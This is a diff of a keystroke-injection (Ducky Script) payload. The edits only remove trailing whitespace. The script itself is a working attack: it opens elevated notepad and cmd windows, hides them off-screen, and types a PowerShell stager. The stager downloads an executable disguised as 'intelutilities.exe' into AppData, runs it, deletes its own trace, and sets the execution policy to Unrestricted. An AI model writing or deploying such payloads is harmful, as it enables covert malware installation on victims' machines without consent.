@@ -1,12 +1,12 @@
 DELAY 1000
-GUI r 
+GUI r
 DELAY 1000
 STRING powershell Start-Process notepad -Verb runAs
 ENTER
-DELAY 1000  
+DELAY 1000
 ALT SPACE
 DELAY 1000
-STRING m 
+STRING m
 DELAY 1000
 DOWNARROW
 REPEAT 100
@@ -15,25 +15,25 @@ STRING (New-Object Net.Webclient).DownloadFile('http://localhost/software/Instal
 ENTER
 STRING Start-Process -FilePath $env:APPDATA\intelutilities.exe
 ENTER
-STRING Remove-Item $MyINvocation.InvocationName 
+STRING Remove-Item $MyINvocation.InvocationName
 ENTER
 CTRL s
 DELAY 1000
 STRING %UserProfile%\AppData\Roaming\script.ps1
 ENTER
 DELAY 1000
-ALT F4 
-DELAY 1000  
-GUI r 
-DELAY 1000  
-STRING powershell Start-Process cmd -Verb runAs 
+ALT F4
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell Start-Process cmd -Verb runAs
 ENTER
 DELAY 1000
-ALT SPACE 
-DELAY 1000  
-STRING m 
-DELAY 1000   
-DOWNARROW 
+ALT SPACE
+DELAY 1000
+STRING m
+DELAY 1000
+DOWNARROW
 REPEAT 100
 ENTER
 STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false
